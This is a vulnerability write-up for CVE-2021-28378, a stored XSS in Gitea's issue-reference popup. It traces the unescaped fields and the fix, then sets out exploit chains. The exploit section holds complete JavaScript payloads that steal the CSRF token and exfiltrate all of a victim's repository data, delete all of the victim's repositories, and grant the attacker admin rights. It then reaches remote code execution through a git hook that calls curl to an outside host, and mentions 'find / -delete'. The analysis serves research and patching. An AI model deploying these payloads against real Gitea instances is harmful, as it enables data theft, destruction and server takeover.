# CVE-2021-28378

Details about this CVE [here](https://www.cvedetails.com/cve/CVE-2021-28378/).

This CVE targets a missing string escaping on the client-side from content fetched from the server.
It enables an attacker to inject arbitrary code easily, by creating a comment on an issue or a pull request.
This was introduced in commit [7d7ab1eeae43d99fe329878ac9c8db5e45e2dee5](https://github.com/go-gitea/gitea/commit/7d7ab1eeae43d99fe329878ac9c8db5e45e2dee5), by the end of Jan 2020, but because of a squash we can't exactly know who did this to investigate for similar bugs introduced (or backdoor, depending on how we see this).

First of all, let's understand where this vulnerability come from. For that, let's see [the commit that fixes this CVE](https://github.com/go-gitea/gitea/pull/14898/commits/1e3c3388fb82235d9f3d63a0bad62ca3ff4682ab).

Before:
 - First:
```js
    labels += `<div class="ui label" style="color: ${color}; background-color:#${label.color};">${label.name}</div>`;
```

 - Second:
```js
    html: `
<div>
    <p><small>${issue.repository.full_name} on ${createdAt}</small></p>
    <p><span class="${color}">${svg(octicon)}</span> <strong>${issue.title}</strong> #${index}</p>
    <p>${body}</p>
    ${labels}
</div>
`
```

We can see there is not any html escaping on `label.name`, `issue.repository.full_name`, `issue.title` and `body`, which are strings a user can manipulate, and so, inject arbitrary code.
Notice the `issue.repository.full_name` cannot really be manipulated to inject code while it has to follow too many rules (`[\w._-]+`) that we cannot bypass with this CVE.
This is exactly what the PR fixes by casting them into `htmlEscape`.

After:
 - First:
```js
    labels += `<div class="ui label" style="color: ${color}; background-color:#${label.color};">${htmlEscape(label.name)}</div>`;
```

 - Second:
```js
    html: `
<div>
    <p><small>${htmlEscape(issue.repository.full_name)} on ${createdAt}</small></p>
    <p><span class="${color}">${svg(octicon)}</span> <strong>${htmlEscape(issue.title)}</strong> #${index}</p>
    <p>${htmlEscape(body)}</p>
    ${labels}
</div>
`
```

## Understanding the vulnerability

Let's take a quick look at the file `web_src/js/features/contextpopup.js`, to figure out how to trigger the CVE.

```js
...
const {AppSubUrl} = window.config;

export default function initContextPopups() {
  const refIssues = $('.ref-issue');
  if (!refIssues.length) return;

  refIssues.each(function () {
    const [index, _issues, repo, owner] = $(this).attr('href').replace(/[#?].*$/, '').split('/').reverse();
    issuePopup(owner, repo, index, $(this));
  });
}

function issuePopup(owner, repo, index, $element) {
  $.get(`${AppSubUrl}/api/v1/repos/${owner}/${repo}/issues/${index}`, (issue) => {
...
    for (let i = 0; i < issue.labels.length; i++) {
...
      labels += `<div class="ui label" style="color: ${color}; background-color:#${label.color};">${label.name}</div>`;
    }
...

    $element.popup({
      variation: 'wide',
      delay: {
        show: 250
      },
      html: `
<div>
  <p><small>${issue.repository.full_name} on ${createdAt}</small></p>
  <p><span class="${color}">${svg(octicon, 16)}</span> <strong>${issue.title}</strong> #${index}</p>
  <p>${body}</p>
  ${labels}
</div>
`
    });
  });
}
```

What we see there is that for each node with the class `ref-issue`, we will add a vulnerable popup.
Now, we need to find where a `ref-issue` is sent to the user: let's grep (and keep only interesting results, so not any test files or similar ones) !
The following commit number corresponds to the 1.12.4 tag, the default version from the official `docker-compose.yml` file, which is affected by this CVE.

```bash
cd gitea
git checkout 8a51c48eb6367513e0518bcd412e64f6cbfe5e1a
grep -r ref-issue

modules/markup/html.go:		replaceContent(node, m[0], m[1], createLink(link, id, "ref-issue"))
modules/markup/html.go:		replaceContent(node, m[0], m[1], createLink(link, orgRepoID, "ref-issue"))
modules/markup/html.go:		link = createLink(com.Expand(ctx.metas["format"], ctx.metas), reftext, "ref-issue")
modules/markup/html.go:			link = createLink(util.URLJoin(setting.AppURL, ctx.metas["user"], ctx.metas["repo"], path, ref.Issue), reftext, "ref-issue")
modules/markup/html.go:			link = createLink(util.URLJoin(setting.AppURL, ref.Owner, ref.Name, path, ref.Issue), reftext, "ref-issue")
modules/markup/sanitizer.go:	sanitizer.policy.AllowAttrs("class").Matching(regexp.MustCompile(`ref-issue`)).OnElements("a")
```

We now know there is no static content with the class `ref-issue`, but it's dynamically generated.
The last is not interesting while it's just a sanitizer policy rule. The others are interesting, we'll see why.

Let's dive into `modules/markup/html.go`.

```go
func fullIssuePatternProcessor(ctx *postProcessCtx, node *html.Node) {
	if ctx.metas == nil {
		return
	}
	m := getIssueFullPattern().FindStringSubmatchIndex(node.Data)
	if m == nil {
		return
	}
	link := node.Data[m[0]:m[1]]
	id := "#" + node.Data[m[2]:m[3]]

	// extract repo and org name from matched link like
	// http://localhost:3000/gituser/myrepo/issues/1
	linkParts := strings.Split(path.Clean(link), "/")
	matchOrg := linkParts[len(linkParts)-4]
	matchRepo := linkParts[len(linkParts)-3]

	if matchOrg == ctx.metas["user"] && matchRepo == ctx.metas["repo"] {
		// TODO if m[4]:m[5] is not nil, then link is to a comment,
		// and we should indicate that in the text somehow
		replaceContent(node, m[0], m[1], createLink(link, id, "ref-issue"))

	} else {
		orgRepoID := matchOrg + "/" + matchRepo + id
		replaceContent(node, m[0], m[1], createLink(link, orgRepoID, "ref-issue"))
	}
}
```

We'll also need to understand what `getIssueFullPattern` does.

```go
func getIssueFullPattern() *regexp.Regexp {
	if issueFullPattern == nil {
		appURL := setting.AppURL
		if len(appURL) > 0 && appURL[len(appURL)-1] != '/' {
			appURL += "/"
		}
		issueFullPattern = regexp.MustCompile(appURL +
			`\w+/\w+/(?:issues|pulls)/((?:\w{1,10}-)?[1-9][0-9]*)([\?|#]\S+.(\S+)?)?\b`)
	}
	return issueFullPattern
}
```

Let's sum up to understand what job is done there.

In `fullIssuePatternProcessor`, we first need to be sure that `ctx.metas` is not nil (what we assume being true while it's built by higher functions/methods in the stack trace).
Then we check if the node data matches a path like `http://mygitea.com/gituser/myrepo/issues/1`. If there is a match, we then replace it by a link.
If the link is about the same user and repo, replace it by the `#<issue_id>` pattern, else by `<user>/<repo>#<issue_id>`.
In those both cases, we have a `ref-issue` class that is added to generate the popup.

The other catch does kind of the same thing.

## Time to play !

Now we have the context, which is about replacing a link like `http://mygitea.com/gituser/myrepo/issues/1` by a shorter link, we can deduce where such job is achieved: in issues and PR, where you can add a label on and/or post a comment.

For this, let's assume you've got a repository with write permissions.

### Label

Go to your repository, and create a new label with a name containing arbitrary code (such as `<script>alert('label.name')</script>`).

### Issue

Go to your repository issues, and create a new issue with arbitrary code in the title and the body, and add it the previous label.

### Let's execute some code

Create a new issue on any repository, and add in its body a link to your injected issue such as `http://mygitea.com/gituser/myrepo/issues/1`.
It will be replaced by the link we previously saw, and when someone will put his mouse over the link, the arbitrary code will get run: a popup is displayed embedding `label.name`.

## Exploit-time

The CVE-2021-28378 is proven being able to enable arbitrary code injection.
Let's imagine what an attacker could do.

On Gitea, you have a CSRF token which asserts your identity when filling forms and/or calling the API, preventing security issues like embedding a Gitea iframe to steal your accesses.
The CSRF token stored in your cookies (`_csrf`), but also in pretty much all the webpages (except some like `/api/v1/swagger`) a user visits under some fields... And so on the issues/PR webpages.
The most interesting field containing it is inside the common header part of the HTML pages, always with the same XPath: `/html/head/meta[9]`.

With this data, we can now send authenticated actions from any user affected by our payload, by simply getting the CSRF token in JS, with the following: `(document.evaluate("/html/head/meta[9]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue).content`.

Now, it's time to use your creativity to build various attacks.
Notice you'll be limited in your actions, but not that much:
 - the `label.name` and `issue.title` must be short, and so not many payloads will fit. Nevertheless, you can inject a `script` with a `src` attribute that will reference any script you want.
 - the `body` is not limited in length, but the preview of the popup doesn't load so much data. Your payload will have to be at the beginning if you want it to get triggered. Nevertheless, you can do as specified previously with a `script` and a `src` attribute.

Let's have a look at some examples you can build.

### Get all the repositories of a user

Imagine the scenario where an attacker wants to get all the repositories you have access to. It proves the attack can break all your confidentiality.
This attack is achieved in 3 steps:
 - steal the CSRF token ;
 - get the list of the repositories ;
 - create a new ticket with the raw JSON content of the previous step.

Let's write some JS code to do this:
```js
var AppURL = "http://mygitea.com";
var HackerRepo = "/hacker/mysaferepo"

var CSRF = (document.evaluate("/html/head/meta[9]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue).content;

var xhrGet = new XMLHttpRequest();
xhrGet.open("GET", AppURL + "/api/v1/repos/search", true);
xhrGet.onload = function() {
    if (xhrGet.readyState === XMLHttpRequest.DONE) {
        var xhrPost = new XMLHttpRequest();
        xhrPost.open("POST", AppURL + HackerRepo + "/issues/new", true);
        xhrPost.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhrPost.send("_csrf=" + CSRF + "&title=Title&content=" + xhrGet.responseText);
    }
}
xhrGet.send(null);
```

Put this payload in its own file, upload it on your repo and inject it in an issue body using something like `<script src="http://mygitea.com/hacker/mysaferepo/raw/branch/master/exploit.js"></script>`.

Now the attacker can comment an issue/PR referencing this injected issue, and when someone put his mouse over the link, he's got all his repositories data stolen by the attacker !

### Delete all the repositories a user has access to

Imagine the scenario where an attacker wants to delete all your repositories you have access to. It proves the attack can break all your integrity.
This attack is achieved in 3 steps:
 - steal the CSRF token ;
 - get the list of the repositories ;
 - for each repository, delete it (at least try).

Let's write some JS code to do this:
```js
var AppURL = "http://mygitea.com";

var CSRF = (document.evaluate("/html/head/meta[9]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue).content;

var xhrGet = new XMLHttpRequest();
xhrGet.responseType = "json";
xhrGet.open("GET", AppURL + "/api/v1/repos/search", true);
xhrGet.onload = function() {
    if (xhrGet.readyState === XMLHttpRequest.DONE) {
        data = xhrGet.response.data;
        data.forEach(repo => {
            var xhrPost = new XMLHttpRequest();
            xhrPost.open("POST", repo.html_url + "/settings", true);
            xhrPost.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhrPost.send("_csrf=" + CSRF + "&action=delete&repo_name=" + repo.name)
        });
    }
}
xhrGet.send(null);
```

Put this payload in its own file, upload it on your repo and inject it in an issue body using something like `<script src="http://mygitea.com/hacker/mysaferepo/raw/branch/master/exploit.js"></script>`.

Now the attacker can comment an issue/PR referencing this injected issue, and when someone put his mouse over the reference, all the repositories he has access to gets deleted !

### Get the admin rights

Imagine the scenario where an attacker wants to get the admin rights. This proves a Privilege Escalation is possible.
This attack is achieved in 2 steps:
 - steal the CSRF token ;
 - give admin rights to the attacker (at least try).

Let's write some JS code to do this:
```js
var AppURL = "http://mygitea.com";
var HackerID = "1";
var HackerEmail = "hacker@example.com";

var CSRF = (document.evaluate("/html/head/meta[9]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue).content;

var xhr = new XMLHttpRequest();
xhr.open("POST", AppURL + "/admin/users/" + HackerID);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send("_csrf=" + CSRF + "&login_type=0-0&login_name=&full_name=&email=" + encodeURIComponent(HackerEmail) + "&password=&website=&location=&max_repo_creation=-1&active=on&admin=on&allow_git_hook=on&allow_create_organization=on");
```

Notice the value of `login_type` can change according to your Gitea version and the way your instance handles login.

Put this payload in its own file, upload it on your repo and inject it in an issue body using something like `<script src="http://mygitea.com/hacker/mysaferepo/raw/branch/master/exploit.js"></script>`.

Now the attacker can comment an issue/PR referencing this injected issue, and when someone with enough rights puts his mouse over the reference, the attacker gets granted admin rights ! He can also assigne the issue to an admin, or create the issue on a repo an admin is watching (so he'll get a notification) to increase its chances.

### Get a RCE

The """funniest""" part with Gitea is that security considerations where not part of the process, by implementing git hooks. It's probably one of the worst idea you could implement.

Once you have admin rights, you can grant you the privilege to manage git hooks (what is achieved with the previous payload). Procede as the [Gitea Git Hooks Remote Code Execution Metasploit module](https://packetstormsecurity.com/files/162122/Gitea-Git-Hooks-Remote-Code-Execution.html) does:
 - add your bash payload into the `post-receive` git-hook ;
 - commit and push something, even if it's empty ;
 - check the effect of the payload.

To make sure this RCE is valid, let's put the following, with a valid `id`.

```bash
#!/bin/bash

curl https://requestbin.net/r/<id>
```

In the RequestBin inspection panel, after we submit a file that triggers the `post-receive` git hook, we see that a request was achieved with a `User-Agent: curl/<version>` which proves it is a valid RCE.

Notice this functionnality implies that for every XSS that can get triggered by an admin, as long as there will be the `_csrf` value embeded in pretty much all the webpages, you can get a RCE on Gitea.

## How to prevent

Do your updates according to the CVE affected versions (refers to the an official report). At the time of writing: 1.12.0 to 1.13.4 (excluded).

## Notes

Here is a list of affected versions and their test status. Notice for 1.13.X versions, you'll have to add `DISABLE_GIT_HOOKS = false` in the `app.ini` file under section `[security]`, which could be located at `data/gitea/conf/app.ini`, depending on where your data folder is (for the `docker-compose.yml` file documented on [DockerHub](https://hub.docker.com/r/gitea/gitea), it'll in the same folder). 

| Version | XSS | RCE |
|---|---|---|
| 1.12.0 | ✅ | ✅ |
| 1.12.1 | ✅ | ✅ |
| 1.12.2 | ✅ | ✅ |
| 1.12.3 | ✅ | ✅ |
| 1.12.4 | ✅ | ✅ |
| 1.12.5 | ✅ | ✅ |
| 1.12.6 | ✅ | ✅ |
| 1.13.0 | ✅ | ✅ |
| 1.13.1 | ✅ | ✅ |
| 1.13.2 | ✅ | ✅ |
| 1.13.3 | ✅ | ✅ |

✅: proved working ; ❓: need tests ; ❌: proved not working

This sheet is made to guide the reader into score calculation: it's only to discuss about scoring, and is not to take as an order.

| Metric | Value | Explanation |
|---|---|---|
| AV | AV:N | Uses HTTP to interact. |
| AC | AC:L | Only needs an issue (by default on Gitea it's really easy to file one because it's enabled to everyone) or a pull request. |
| PR | PR:L | In most contexts, needs an account to create an issue (by default, you can register new accounts). All the accounts can create an issue on a read-only repository, expect in case the repo has been configured to avoid issues (which is not the default setting and rarely modified). |
| UI | UI:R | An user or admin has to put his mouse over the infected link to triggers a payload. |
| S | S:C | With the RCE, you have access to the host machine and so everything on it (except in case Gitea has been perfectly isolated, what is not officially documented or even discussed, and cannot be proved being perfect). |
| C | C:H | Once you've got the admin rights, you can manage everything even if it has been configured private. You are able to steal database credentials, connect to it using the RCE and extract data. With the RCE, you can directly read the file system, where no authentication/authorization checks are achieved by Gitea. |
| I | I:H | Once you've got the admin rights, you can modify rights, visibility, change the repository code, even delete the repository. With the RCE, you're free to dive into everything and so impact the integrity of users, files... |
| A | A:H | Given the RCE, you can simply delete the whole file system with a `find / -delete`, causing a total loss of availability. |
| E | E:H | Given the python script `exploit.py`, you can completly run the attack from bare to a reverse shell. |
| RL | RL:O | Fixed by commit `<1e3c3388fb82235d9f3d63a0bad62ca3ff4682ab>`, merged into master and so into Gitea 1.13.4. |
| RC | RC:C | This report confirms and shows multiple exploits, from the XSS origin analysis to a RCE example and autonomous script. |
| MAV | MAV:N | Uses HTTP to interact, but with the RCE you can uses other protocols. |
| MAC | MAC:L | Once you've got a reverse shell using the RCE, you're free to play on the host. |
| MPR | MPR:L | Once you've got a reverse shell using the RCE, you have the rights inherited from the user that ran it. Considering that you are now in the server file system, you have access to pretty much everything on it, including secrets in case there are some (to connect to the DB, an AD or even a Drone CI) only by reading env variables or `data/gitea/conf/app.ini`. |
| MUI | MUI:N | Once you've got the RCE, you can implement a backdoor so no further user interaction will be needed, and the attacker account can be deleted to hide the tracks. |
| MS | MS:C | With the RCE and a reverse shell/backdoor, you are free to go on the host server, steal tokens to connect to other authorities...etc. |
| MC | MC:H | Given the RCE, you are free to play on the host server, and so on the whole Gitea instance and everything that is in its environment (file system, other authorities, processes...). |
| MI | MI:H | Given the RCE, you are free to play on the host server, and so on the whole Gitea instance and everything that is in its environment (file system, other authorities, processes...).|
| MA | MA:H | Given the RCE, you are free to play on the host server, and so on the whole Gitea instance and everything that is in its environment (file system, other authorities, processes...).|
| CR | CR:H | Given the RCE, you are free to play on the host server. Even if it's a Docker container, Gitea doc does not explain how to isolate it, so it will be possible to affect host processes with the non-remapped PIDs, there is no seccomp so you can change Gitea source code easily, no quota so you can DoS the host server, no capabilities list is set so you can do every Docker call you want... |
| IR | IR:H | Given the RCE, you are free to play on the host server. Even if it's a Docker container, Gitea doc does not explain how to isolate it, so it will be possible to affect host processes with the non-remapped PIDs, there is no seccomp so you can change Gitea source code easily, no quota so you can DoS the host server, no capabilities list is set so you can do every Docker call you want... |
| AR | AR:M | Given the RCE, you are free to play on the host server. Even if it's a Docker container, Gitea doc does not explain how to isolate it, so it will be possible to affect host processes with the non-remapped PIDs, there is no seccomp so you can change Gitea source code easily, no quota so you can DoS the host server, no capabilities list is set so you can do every Docker call you want... While you don't host customer/internal services directly on the Gitea instance, you won't catastrophically affect them, but you'll be able to stop their business to get updated. With a bit of luck, in case you are delivering from Gitea with the Git hooks you can still dramatically stop their business from running. |

Vector string: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C/CR:H/IR:H/AR:M/MAV:N/MAC:L/MPR:N/MUI:N/MS:C`

| Metric group name | Score | Verbose |
|---|---|---|
| Base Score | **9.0** | Critical |
| Temporal Score | **8.6** | High |
| Environmental Score | **9.5** | Critical |
